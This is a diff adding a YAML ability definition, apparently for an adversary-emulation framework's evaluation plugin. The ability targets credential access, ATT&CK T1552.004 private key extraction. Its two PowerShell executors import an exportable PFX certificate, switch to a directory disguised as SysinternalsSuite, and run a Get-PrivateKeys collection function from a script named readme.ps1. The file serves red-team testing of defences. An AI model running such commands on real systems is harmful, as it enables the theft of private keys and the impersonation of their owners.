@@ -1,0 +1,59 @@
+ability_id: c4f4b13c-87b6-498c-b814-93570173068c
+access: {}
+additional_info: {}
+buckets:
+- credential-access
+delete_payload: true
+description: Obtain credentials via Custom PowerShell
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Import-PfxCertificate -Exportable -FilePath \".\\dmevals.local.pfx\" -CertStoreLocation\
+    \ Cert:\\LocalMachine\\My;\n\nif (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\"\
+    )) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not\
+    \ exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program\
+    \ Files\\SysinternalsSuite\";\n. .\\readme.ps1;\nGet-PrivateKeys;\nif ($? -eq\
+    \ $True) {\n    write-host \"[+] Successfully executed private key collection\
+    \ script.\";\n    exit 0;\n} else {\n    write-host \"[!] Error, could not execution\
+    \ Get-PrivateKeys.\";\n    exit 1;\n}"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - dmevals.local.pfx
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: "Import-PfxCertificate -Exportable -FilePath \".\\dmevals.local.pfx\" -CertStoreLocation\
+    \ Cert:\\LocalMachine\\My;\n\nif (! $(test-path -path \"C:\\Program Files\\SysinternalsSuite\"\
+    )) {\n  write-host \"[!] The path C:\\Program Files\\SysinternalsSuite does not\
+    \ exist. Execution has stopped.\";\n  exit 1;\n}\nSet-Location -path \"C:\\Program\
+    \ Files\\SysinternalsSuite\";\n. .\\readme.ps1;\nGet-PrivateKeys;\nif ($? -eq\
+    \ $True) {\n    write-host \"[+] Successfully executed private key collection\
+    \ script.\";\n    exit 0;\n} else {\n    write-host \"[!] Error, could not execution\
+    \ Get-PrivateKeys.\";\n    exit 1;\n}"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - dmevals.local.pfx
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Credentials In Files (T1081) - Private Keys Extraction
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: credential-access
+technique_id: T1552.004
+technique_name: 'Unsecured Credentials: Private Keys'
